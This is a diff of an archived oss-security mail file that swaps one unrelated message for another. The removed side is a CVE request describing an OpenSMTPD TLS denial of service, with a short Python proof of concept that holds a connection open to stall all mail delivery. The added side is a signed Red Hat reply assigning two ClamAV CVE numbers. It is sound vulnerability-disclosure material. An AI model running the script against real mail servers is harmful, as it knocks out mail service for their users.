@@ -1,40 +1,68 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/18/8
-Message-ID: <CAHmME9owpZDRXNapOco4xOxmny3frQcYRTQZRUEDB9dKPz-RFA@mail.gmail.com>
-Date: Sat, 18 May 2013 16:27:22 +0200
-From: "Jason A. Donenfeld" <Jason@...c4.com>
-To: oss-security <oss-security@...ts.openwall.com>
-Cc: misc@...nsmtpd.org
-Subject: CVE Request: DoS in OpenSMTPD TLS Support
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/29/20
+Message-ID: <517EDE7F.80906@redhat.com>
+Date: Mon, 29 Apr 2013 14:56:31 -0600
+From: Kurt Seifried <kseifried@...hat.com>
+To: oss-security@...ts.openwall.com
+CC: Salvatore Bonaccorso <carnil@...ian.org>, Felix Gröbert <groebert@...gle.com>, Henri Salo <henri@...v.fi>, Jan Lieskovsky <jlieskov@...hat.com>, "Steven M. Christey" <coley@...us.mitre.org>, draynor@...rcefire.com
+Subject: Re: Multiple potential security issues fixed in ClamAV 0.97.8 - any further details?
 Content-Type: text/plain; charset=utf-8
 
-Hi Kurt,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-The SSL handling in the latest OpenSMTPD (5.3.1) misconfigures its
-sockets in blocking mode, allowing an attacker to prevent all mail
-delivery simply by holding a socket open.
+On 04/29/2013 02:20 PM, Salvatore Bonaccorso wrote:
+> Hi Kurt
+> 
+> On Mon, Apr 29, 2013 at 01:27:18PM -0600, Kurt Seifried wrote:
+>> -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1
+>> 
+>> On 04/27/2013 04:49 PM, Felix Gröbert wrote:
+>>> Hi,
+>>> 
+>>> sorry for the delayed response, I'm OOO.
+>>> 
+>>> The bugs should be public now:
+>>> 
+>>> https://bugzilla.clamav.net/show_bug.cgi?id=7055 heap
+>>> corruption, potentially exploitable.
+>> 
+>> Please use CVE-2013-2020 for this issue.
 
-I discovered this accidentally, as I noticed my HP printer's smtp
-client would keep the connection indefinitely open after an
-unsuccessful authentication attempt, causing no more mail to be
-delivered until I SIGKILL'd my smtpd process or unplugged my printer.
+Please continue to use CVE-2013-2020 for the heap corruption issue.
 
-The following reproduces the attack trivially:
+>>> https://bugzilla.clamav.net/show_bug.cgi?id=7053 overflow due
+>>> to PDF key length computation. Potentially exploitable.
+>> 
+>> Please use CVE-2013-2020 for this issue.
+> 
+> Should these get separates CVE (as two different types)? Only
+> would like to confirm, in case this was a typo.
 
-    #!/usr/bin/env python2
-    import smtplib
-    import time
-    print "[+] Connecting to server and initiating TLS"
-    smtp = smtplib.SMTP("mail.some-vitim-host.blah", 587)
-    smtp.starttls()
-    print "[+] No clients will be able to connect as long as this remains open."
-    time.sleep(100000000)
+Argh cut and paste fail (two today). Please use CVE-2013-2021 for the
+ClamAV PDF key length issue.
 
-Apparently this was fixed recently upstream, noting "evil client" in
-the commit message:
-http://git.zx2c4.com/OpenSMTPD/commit/?id=38b26921bad5fe24ad747bf9d591330d683728b0
+> Regards, Salvatore
+> 
 
-A snapshot has been posted to http://www.opensmtpd.org/archives/ , but
-no patch release has yet been made.
 
-Jason
+- -- 
+Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.13 (GNU/Linux)
+
+iQIcBAEBAgAGBQJRft5+AAoJEBYNRVNeJnmT2CQQAN2u5Y+AqOMZLPJgpTBP89PG
+7CNbD4/MmUpRjVcoOCe1mAdDtu+VD1ttcKswdl/NsQCIe667jxMWZ+yu5KqORghh
+3mt7xqbqDWwthjEnmciEUNak3rm/+tSYJnOHzFUWm+gksU2JqEIz1mmAIKJA5jw9
+gx638G/POxgLtCic9LZ+kVKK36XXMHOVCvfehTM7/cGYipNqDdHdHIYszBbZALtB
+AXSZoPpHSOBI6El2c1MkC/dbbIl+vs6zJmJbNLKK7fZVlu8HbMuOnu/OLvT5W8qa
+c/pWnju0OGjgA58ysQ7TlLjalThflBRBkOstZweiF3Er51WV0x40rPonVPl8bmJ3
+ORdtjB8At97qtU54cR0ApROpCO70YQVfk0XLdy1J1zkwakCekUE7RfEVAkzwZQLw
+n7PJ1nKylD0yD73L7pQlWhXlpnrEFytzKmv/s1SjuU7PtN9+0rhErfx4WerMg0cg
+WBpAm+zaruPWc8hIjmCqzJo5YsLG0yVe5cpXGRrEkzunhNCR+s/QZqdKHWfosPMf
+m4XNDVqhDr0IhPHKkQiTTDAhIqS2NbnyRaUqXFkQAjsuBThlHZtWIqkfhN3vU5YK
++9nVWpYHJiLDJOK1Ei72VeI6siZqpRM52r1a58HBvK75s4mhcKGo/cPEGCAEal3+
+cNgAUxjxyc7TZiFmPgQQ
+=kmmB
+-----END PGP SIGNATURE-----
